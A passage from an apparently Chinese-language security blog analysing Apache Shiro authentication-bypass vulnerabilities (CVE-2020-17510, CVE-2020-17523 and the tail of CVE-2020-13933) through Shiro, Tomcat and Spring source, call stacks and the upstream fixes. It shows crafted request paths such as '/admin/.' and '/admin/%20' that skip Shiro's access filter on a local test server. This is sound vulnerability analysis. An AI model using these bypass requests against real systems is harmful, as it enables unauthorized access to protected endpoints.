class="string">&quot;Matched path pattern [&quot;</span> + pathPattern + <span class="string">&quot;] for requestURI [&quot;</span> + Encode.forHtml(requestURI) + <span class="string">&quot;].  &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;Utilizing corresponding filter chain...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> filterChainManager.proxy(originalChain, pathPattern);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="tomcat-处理部分-3">Tomcat 处理部分</h4>
<h5 id="调用栈-4">调用栈</h5>
<p>一路往下一直到 <strong>SpringBoot</strong> 的
<strong>getRequestUri</strong> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getRequestUri:349, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getPathWithinApplication:265, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getPathWithinServletMapping:216, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getLookupPathForRequest:172, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getHandlerInternal:363, AbstractHandlerMethodMapping (org.springframework.web.servlet.handler)</span><br><span class="line">getHandlerInternal:110, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)</span><br><span class="line">getHandlerInternal:59, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)</span><br><span class="line">getHandler:395, AbstractHandlerMapping (org.springframework.web.servlet.handler)</span><br><span class="line">getHandler:1234, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doDispatch:1016, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:943, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:1006, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:898, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:634, HttpServlet (javax.servlet.http)</span><br><span class="line">service:883, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:741, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:53, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">executeChain:449, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br></pre></td></tr></table></figure>
<h5 id="getrequesturi-5">getRequestUri</h5>
<p>同上一个 <strong>CVE</strong> 的处理方式一样，在
<strong>SpringBoot</strong> 的 <strong>getRequestUri</strong>
方法中调用的 <strong>getRequestURI</strong> 方法返回的是原始的值
<strong>/admin/%3bcmd</strong>，并未经过 <strong>URL</strong> 解码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getRequestUri</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> (String) request.getAttribute(WebUtils.INCLUDE_REQUEST_URI_ATTRIBUTE);</span><br><span class="line">    <span class="keyword">if</span> (uri == <span class="literal">null</span>) &#123;</span><br><span class="line">        uri = request.getRequestURI();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> decodeAndCleanUriString(request, uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="decodeandcleanuristring-5">decodeAndCleanUriString</h5>
<p>而后先移除了 <strong>;</strong>，然后才进行 <strong>URL</strong>
解码，得到 <strong>/admin/;cmd</strong>，因此匹配到
<strong>/admin/*</strong>，得以绕过。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> &#123;</span><br><span class="line">    uri = removeSemicolonContent(uri);</span><br><span class="line">    uri = decodeRequestString(request, uri);</span><br><span class="line">    uri = getSanitizedPath(uri);</span><br><span class="line">    <span class="keyword">return</span> uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞修复-2">漏洞修复</h2>
<p><strong><a
href="https://github.com/apache/shiro/commit/dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d">Commit</a></strong>
如下，<strong>org.apache.shiro.spring.web#ShiroFilterFactoryBean</strong>
中增加了 <strong>/**</strong>
的默认路径配置，使其可以全局匹配进行过滤校验。</p>
<p><img
src="/images/Study-Unauthorized-Shiro/github.com_apache_shiro_commit_dc194fc977ab6cfbf3c1ecb085e2bac5db14af6d.png" /></p>
<p>默认的 <strong>/**</strong> 配置对应一个全局的
<strong>InvalidRequestFilter</strong>，这个类继承了
<strong>AccessControlFilter</strong>。用来过滤特殊字符（分号、反斜线、非
<strong>ASCII</strong> 码字符)，并返回 <strong>400</strong> 状态码。</p>
<h1 id="cve-2020-17510">CVE-2020-17510</h1>
<h2 id="漏洞简介-3">漏洞简介</h2>
<p>影响版本：<strong>shiro &lt; 1.7.0</strong></p>
<p>漏洞描述：第三种 <strong>AntPathMatcher</strong> 的绕过方式</p>
<p>测试环境：<strong>Shiro 1.6.0</strong>，<strong>SpringBoot
2.5.3</strong></p>
<h2 id="漏洞分析-3">漏洞分析</h2>
<p>这个漏洞还是对 <strong>AntPathMatcher</strong> 的继续绕过,在
<strong>CVE-2020-11989</strong> 和 <strong>CVE-2020-13933</strong>
分别尝试了 <strong>/</strong> 的双重 <strong>URL</strong> 编码和
<strong>;</strong> 的 <strong>URL</strong>
编码绕过，归根到底这种方式还是因为<strong>Shiro</strong>与<strong>Spring</strong>对<strong>URI</strong>处理的差异化导致的。</p>
<p>上一个版本使用了全局的 <strong>InvalidRequestFilter</strong> 方法过滤
<strong>;</strong>，但是字符 <strong>.</strong> 同样会在
<strong>getServletPath</strong> 方法中进行标准化处理，</p>
<h3 id="绕过-2">. 绕过</h3>
<p>配置如下。</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.properties</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">9090</span></span><br></pre></td></tr></table></figure>
<p><strong>HTTP</strong> 请求如下。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET http://127.0.0.1:9090/admin/.</span><br></pre></td></tr></table></figure>
<h4 id="shiro-处理部分-4"><strong>Shiro</strong> 处理部分</h4>
<h5 id="调用栈-5">调用栈</h5>
<p>一路往下一直到 <strong>getPathWithinApplication</strong> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getPathWithinApplication:112, WebUtils (org.apache.shiro.web.util)</span><br><span class="line">getPathWithinApplication:164, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getChain:103, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getExecutionChain:415, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">executeChain:448, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br></pre></td></tr></table></figure>
<h5 id="getpathwithinapplication-4">getPathWithinApplication</h5>
<p><strong>getPathWithinApplication</strong> 调用了
<strong>getServletPath</strong> 来获取 <strong>URI</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WebUtils (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPathWithinApplication</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> normalize(removeSemicolon(getServletPath(request) + getPathInfo(request)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getservletpath-1">getServletPath</h5>
<p>跟进 <strong>getServletPath</strong>，可见是调用了映射处理时候封装的
<strong>wrapperPath</strong> 成员变量，直接返回
<strong>/admin/</strong>，而后便同 <strong>CVE-2020-13933</strong>
一样，<strong>/admin/</strong> 被处理为
<strong>/admin</strong>，无法匹配上 <strong>/admin/*</strong>，从而
<strong>Shiro</strong> 的过滤链失效，然后进入 <strong>Tomcat</strong>
的默认过滤链。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Request (org.apache.catalina.connector)</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getServletPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mappingData.wrapperPath.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="tomcat-处理部分-4">Tomcat 处理部分</h4>
<h5 id="调用栈-6">调用栈</h5>
<p>一路往下一直到 <strong>SpringBoot</strong> 的
<strong>getRequestUri</strong> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getRequestUri:433, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getPathWithinApplication:355, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getLookupPathForRequest:249, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">resolveAndCacheLookupPath:200, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">initLookupPath:579, AbstractHandlerMapping (org.springframework.web.servlet.handler)</span><br><span class="line">getHandlerInternal:376, AbstractHandlerMethodMapping (org.springframework.web.servlet.handler)</span><br><span class="line">getHandlerInternal:125, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)</span><br><span class="line">getHandlerInternal:67, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)</span><br><span class="line">getHandler:498, AbstractHandlerMapping (org.springframework.web.servlet.handler)</span><br><span class="line">getHandler:1258, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doDispatch:1040, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:963, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:1006, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:898, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:655, HttpServlet (javax.servlet.http)</span><br><span class="line">service:883, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:764, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:228, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:163, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:53, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:190, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:163, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:61, ProxiedFilterChain (org.apache.shiro.web.servlet)</span><br><span class="line">executeChain:108, AdviceFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilterInternal:137, AdviceFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:66, ProxiedFilterChain (org.apache.shiro.web.servlet)</span><br><span class="line">executeChain:450, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br></pre></td></tr></table></figure>
<h5 id="getrequesturi-6">getRequestUri</h5>
<p>同上一个 <strong>CVE</strong> 的处理方式一样，在
<strong>SpringBoot</strong> 的 <strong>getRequestUri</strong>
方法中调用的 <strong>getRequestURI</strong> 方法返回的是原始的值
<strong>/admin/.</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getRequestUri</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> (String) request.getAttribute(WebUtils.INCLUDE_REQUEST_URI_ATTRIBUTE);</span><br><span class="line">    <span class="keyword">if</span> (uri == <span class="literal">null</span>) &#123;</span><br><span class="line">        uri = request.getRequestURI();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> decodeAndCleanUriString(request, uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="decodeandcleanuristring-6">decodeAndCleanUriString</h5>
<p><strong>URL</strong> 解码，依旧是
<strong>/admin/.</strong>，因此匹配到
<strong>/admin/</strong>*，得以绕过。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> &#123;</span><br><span class="line">    uri = removeSemicolonContent(uri);</span><br><span class="line">    uri = decodeRequestString(request, uri);</span><br><span class="line">    uri = getSanitizedPath(uri);</span><br><span class="line">    <span class="keyword">return</span> uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞修复-3">漏洞修复</h2>
<p>在 <a
href="https://github.com/apache/shiro/commit/6acaaee9bb3a27927b599c37fabaeb7dd6109403"><strong>Commit</strong></a>
中发现 <strong>org.apache.shiro.spring.web</strong> 下新增了
<strong>ShiroUrlPathHelper</strong> 类，属于
<strong>UrlPathHelper</strong> 的子类，重写了
<strong>getPathWithinApplication</strong> 和
<strong>getPathWithinServletMapping</strong>
两个方法，通过相关配置后，<strong>SpringBoot</strong> 就会使用
<strong>Shiro</strong> 的
<strong>UrlPathHelper</strong>，这样两者判断逻辑一致，就不存在因差异性问题而导致的绕过了。</p>
<p><img
src="/images/Study-Unauthorized-Shiro/github.com_apache_shiro_commit_6acaaee9bb3a27927b599c37fabaeb7dd6109403.png" /></p>
<h1 id="cve-2020-17523">CVE-2020-17523</h1>
<h2 id="漏洞简介-4">漏洞简介</h2>
<p>影响版本：<strong>Shiro &lt; 1.7.1</strong></p>
<p>漏洞描述：<strong>Shiro 1.7.1</strong> 之前的版本，在将
<strong>Shiro</strong> 与 <strong>Spring</strong> 结合使用时，特制的
<strong>HTTP</strong> 请求可能会导致身份验证绕过。</p>
<p>测试环境：<strong>Shiro 1.7.0</strong>，<strong>SpringBoot
2.5.3</strong></p>
<h2 id="漏洞分析-4">漏洞分析</h2>
<p>如 <strong>CVE-2020-17510</strong> 那样，这个漏洞可以使用空格
<strong>%20</strong>
进行绕过。这个漏洞的主要原因是代码中，<strong>Shiro</strong> 会对请求的
<strong>URI</strong> 进行鉴权操作，校验的函数为
<strong>PathMatches</strong>，当 <strong>PathMatches</strong> 返回
<strong>true</strong> 时才会进入鉴权。</p>
<h3 id="空格绕过分析">空格绕过分析</h3>
<p>配置如下。</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.properties</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">9090</span></span><br></pre></td></tr></table></figure>
<p><strong>HTTP</strong> 请求如下。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET http://127.0.0.1:9090/admin/%20</span><br></pre></td></tr></table></figure>
<h4 id="shiro-处理部分-5">Shiro 处理部分</h4>
<h5 id="调用栈-7">调用栈</h5>
<p>和 <strong>CVE-2020-17510</strong> 类似，一路往下一直到
<strong>getPathWithinApplication</strong> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getPathWithinApplication:114, WebUtils (org.apache.shiro.web.util)</span><br><span class="line">getPathWithinApplication:164, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getChain:103, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getExecutionChain:416, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">executeChain:449, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br></pre></td></tr></table></figure>
<h5 id="getpathwithinapplication-5">getPathWithinApplication</h5>
<p>同样是调用 <strong>getPathWithinApplication</strong>
方法，并且进行标准化处理，直接返回 <strong>/admin/[空格]</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// WebUtils (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPathWithinApplication</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> normalize(removeSemicolon(getServletPath(request) + getPathInfo(request)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getchain-3">getChain</h5>
<p>跟进 <strong>pathMatches</strong> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span></span><br><span class="line"><span class="keyword">public</span> FilterChain <span class="title function_">getChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain originalChain)</span> &#123;</span><br><span class="line">    <span class="type">FilterChainManager</span> <span class="variable">filterChainManager</span> <span class="operator">=</span> <span class="built_in">this</span>.getFilterChainManager();</span><br><span class="line">    <span class="keyword">if</span> (!filterChainManager.hasChains()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> <span class="built_in">this</span>.getPathWithinApplication(request); <span class="comment">// requestURI: &quot;/admin/ &quot;</span></span><br><span class="line">        <span class="keyword">if</span> (requestURI != <span class="literal">null</span> &amp;&amp; !<span class="string">&quot;/&quot;</span>.equals(requestURI) &amp;&amp; requestURI.endsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">            requestURI = requestURI.substring(<span class="number">0</span>, requestURI.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var6</span> <span class="operator">=</span> filterChainManager.getChainNames().iterator();</span><br><span class="line"></span><br><span class="line">        String pathPattern;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!var6.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            pathPattern = (String)var6.next(); <span class="comment">// pathPattern: &quot;/admin/*&quot;</span></span><br><span class="line">            <span class="keyword">if</span> (pathPattern != <span class="literal">null</span> &amp;&amp; !<span class="string">&quot;/&quot;</span>.equals(pathPattern) &amp;&amp; pathPattern.endsWith(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">                pathPattern = pathPattern.substring(<span class="number">0</span>, pathPattern.length() - <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span>(!<span class="built_in">this</span>.pathMatches(pathPattern, requestURI));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Matched path pattern [&quot;</span> + pathPattern + <span class="string">&quot;] for requestURI [&quot;</span> + Encode.forHtml(requestURI) + <span class="string">&quot;].  Utilizing corresponding filter chain...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> filterChainManager.proxy(originalChain, pathPattern);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="tokenizetostringarray">tokenizeToStringArray</h5>
<p><strong>pathMatches</strong> 开始一路转至
<strong>doMatch</strong>，进入 <strong>tokenizeToStringArray</strong>
方法，在 <strong>tokenizeToStringArray</strong>
中，<strong>trimTokens</strong> 默认设置为
<strong>true</strong>，所以在按 <strong>/</strong> 分割字符串后经
<strong>token.trim()</strong> 处理，空格等字符会被清除，返回
<strong>admin</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// StringUtils (org.apache.shiro.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String[] tokenizeToStringArray(String str, String delimiters) &#123; <span class="comment">// str:&quot;/admin/ &quot;, delimiters: &quot;/&quot;</span></span><br><span class="line">    <span class="keyword">return</span> tokenizeToStringArray(str, delimiters, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String[] tokenizeToStringArray(String str, String delimiters, <span class="type">boolean</span> trimTokens, <span class="type">boolean</span> ignoreEmptyTokens) &#123;</span><br><span class="line">    <span class="keyword">if</span> (str == <span class="literal">null</span>) &#123; <span class="comment">// str: &quot;/admin/ &quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">StringTokenizer</span> <span class="variable">st</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringTokenizer</span>(str, delimiters);</span><br><span class="line">        <span class="type">List</span> <span class="variable">tokens</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            String token;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!st.hasMoreTokens()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> toStringArray(tokens);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                token = st.nextToken();</span><br><span class="line">                <span class="keyword">if</span> (trimTokens) &#123; <span class="comment">// true</span></span><br><span class="line">                    token = token.trim(); </span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span>(ignoreEmptyTokens &amp;&amp; token.length() &lt;= <span class="number">0</span>);</span><br><span class="line">            tokens.add(token);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="domatch">doMatch</h5>
<p><strong>tokenizeToStringArray</strong> 返回的是
<strong>["admin"]</strong>，数组长度不同于
<strong>pattern</strong>，因此循环到第二次比对时退出，匹配失败，然后继续进入
<strong>SpringBoot</strong> 的过滤链。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AntPathMatcher (org.apache.shiro.util)</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">doMatch</span><span class="params">(String pattern, String path, <span class="type">boolean</span> fullMatch)</span> &#123; <span class="comment">// pattern: &quot;/admin/*&quot;, path: &quot;/admin/ &quot;, fullMatch: true</span></span><br><span class="line">    <span class="keyword">if</span> (path.startsWith(<span class="built_in">this</span>.pathSeparator) != pattern.startsWith(<span class="built_in">this</span>.pathSeparator)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String[] pattDirs = StringUtils.tokenizeToStringArray(pattern, <span class="built_in">this</span>.pathSeparator); <span class="comment">// pattern: &quot;/admin/*&quot;, pattDirs: [&quot;admin&quot;, &quot;*&quot;]</span></span><br><span class="line">    String[] pathDirs = StringUtils.tokenizeToStringArray(path, <span class="built_in">this</span>.pathSeparator); <span class="comment">// path: &quot;/admin/ &quot;, pathDirs: [&quot;admin&quot;], pathSeparator: &quot;/&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">pattIdxStart</span> <span class="operator">=</span> <span class="number">0</span>; </span><br><span class="line">    <span class="type">int</span> <span class="variable">pattIdxEnd</span> <span class="operator">=</span> pattDirs.length - <span class="number">1</span>; <span class="comment">// 1</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">pathIdxStart</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pathIdxEnd</span> <span class="operator">=</span> pathDirs.length - <span class="number">1</span>; <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 匹配所有的元素知道第一个 **</span></span><br><span class="line">    <span class="keyword">while</span> (pattIdxStart &lt;= pattIdxEnd &amp;&amp; pathIdxStart &lt;= pathIdxEnd) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">patDir</span> <span class="operator">=</span> pattDirs[pattIdxStart]; <span class="comment">// patDir: [&quot;admin&quot;, &quot;*&quot;]</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;**&quot;</span>.equals(patDir)) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="keyword">if</span> (!matchStrings(patDir, pathDirs[pathIdxStart])) &#123; <span class="comment">// pathDirs: [&quot;admin&quot;], patDir: &quot;admin&quot;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pattIdxStart++;</span><br><span class="line">        pathIdxStart++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="tomcat-处理部分-5">Tomcat 处理部分</h4>
<h5 id="调用栈-8">调用栈</h5>
<p>和之前的 <strong>CVE-2020-17510</strong> 类似，一路往下一直到
<strong>SpringBoot</strong> 的 <strong>getRequestUri</strong> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getRequestUri:345, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getPathWithinApplication:265, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getLookupPathForRequest:169, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getHandlerInternal:363, AbstractHandlerMethodMapping (org.springframework.web.servlet.handler)</span><br><span class="line">getHandlerInternal:110, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)</span><br><span class="line">getHandlerInternal:59, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)</span><br><span class="line">getHandler:395, AbstractHandlerMapping (org.springframework.web.servlet.handler)</span><br><span class="line">getHandler:1234, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doDispatch:1016, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:943, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:1006, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:898, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:634, HttpServlet (javax.servlet.http)</span><br><span class="line">service:883, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:741, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:53, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:61, ProxiedFilterChain (org.apache.shiro.web.servlet)</span><br><span class="line">executeChain:108, AdviceFilter (org.apache.shiro.web.servlet)</span><br></pre></td></tr></table></figure>
<h5 id="getrequesturi-7">getRequestUri</h5>
<p>同上一个 <strong>CVE</strong> 的处理方式一样，在
<strong>SpringBoot</strong> 的 <strong>getRequestUri</strong>
方法中调用的 <strong>getRequestURI</strong> 方法返回的是原始的值
<strong>/admin/%20</strong>，并未经过 <strong>URL</strong> 解码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getRequestUri</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> (String) request.getAttribute(WebUtils.INCLUDE_REQUEST_URI_ATTRIBUTE);</span><br><span class="line">    <span class="keyword">if</span> (uri == <span class="literal">null</span>) &#123;</span><br><span class="line">        uri = request.getRequestURI();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> decodeAndCleanUriString(request, uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="decodeandcleanuristring-7">decodeAndCleanUriString</h5>
<p><strong>URL</strong> 解码，得到 <strong>/admin/[空格]</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> &#123;</span><br><span class="line">    uri = removeSemicolonContent(uri);</span><br><span class="line">    uri = decodeRequestString(request, uri);</span><br><span class="line">    uri = getSanitizedPath(uri);</span><br><span class="line">    <span class="keyword">return</span> uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="tokenizetostringarray-1">tokenizeToStringArray</h5>
<p>接下来同 <strong>Shiro</strong> 一样，按照 <strong>/</strong>
分割并调用 <strong>trim</strong> 方法，差别在默认的
<strong>trimTokens</strong> 是
